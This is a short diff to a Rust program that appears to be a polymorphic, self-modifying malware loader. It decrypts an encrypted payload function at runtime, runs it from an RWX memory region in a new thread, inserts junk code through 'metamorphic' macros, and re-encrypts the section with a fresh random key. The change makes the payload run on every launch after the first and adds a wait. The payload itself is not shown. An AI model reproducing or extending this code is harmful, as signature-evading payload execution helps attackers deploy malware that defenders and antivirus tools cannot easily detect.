@@ -4,7 +4,7 @@
 use std::arch::asm;
 use std::env;
 use std::thread;
-// use std::time::Duration;
+use std::time::Duration;
 use std::ptr::{copy, read_volatile};
 use std::mem::transmute;
 
@@ -54,7 +54,8 @@ fn main() {
     // Decrypt payload function section
     let mut decrypted_func = polymorphic::decrypt_func(&mut code, key, nonce, first).ok().unwrap(); metamorphic::junk!();
 
-    if first == 0 {
+    // Don't run payload in first run
+    if first != 0 {
         thread::spawn(move || {
             unsafe {
                 // Create RWX memory region
@@ -79,6 +80,9 @@ fn main() {
             }
         });
     }
+
+    // Wait for decrypted payload function to finish
+    thread::sleep(Duration::from_millis(100));
 
     // Re-encrypt payload function section with new random key
     polymorphic::encrypt_func(&mut code, &mut decrypted_func).ok(); metamorphic::junk!();
